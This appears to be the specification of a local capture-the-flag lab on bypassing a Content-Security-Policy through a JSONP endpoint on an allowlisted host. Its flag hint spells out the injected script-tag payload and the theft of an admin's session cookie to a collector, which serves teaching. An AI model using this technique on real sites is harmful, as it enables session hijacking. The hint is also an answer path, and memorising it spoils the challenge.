title: CSP Bypass via JSONP Endpoint in Allowlist
learning_objectives: Read a Content-Security-Policy and reason about what it does and does NOT stop: a strict script-src (no 'unsafe-inline') blocks reflected inline <script> and inline event handlers, so an HTML injection alone does not execute
Recognise that a CSP script-src allowlist is only as safe as every host on it: a single allowlisted origin that exposes a JSONP (or other reflected-JS) endpoint hands back arbitrary script execution
Chain an HTML injection with a trusted-host JSONP callback: a <script src> pointing at the allowlisted host satisfies the CSP, and the callback parameter carries the attacker's code
Understand why CSP is defence-in-depth, not a substitute for output encoding — and how to audit an allowlist (drop hosts with JSONP/AngularJS/user-content, prefer nonces/hashes over host allowlists)
Exfiltrate a same-origin secret (the admin's non-HttpOnly session cookie) once script runs in the protected origin
flag_hint: The reflected ?q= injection cannot run inline script (CSP has no 'unsafe-inline'), but script-src allowlists http://accounts-trusted:8080, which has /api/jsonp?callback=. Reflect <script src="http://accounts-trusted:8080/api/jsonp?callback=<your JS>//"></script>; the CSP permits the source and the JSONP echoes your JS into execution in the app origin. Steal document.cookie to the collector, read /oob/received, POST /solve {"c":"<32 hex>"}.
tech_stack: stdlib mock trusted-host with a JSONP callback endpoint (the CSP-allowlisted script origin)
inspired_by: The well-documented CSP script-src allowlist bypass class (Google's CSP-is-dead research on JSONP/AngularJS gadgets on allowlisted hosts), abstracted for local Docker with a Flask target, a mock allowlisted JSONP host, a Playwright admin bot, and an OOB collector
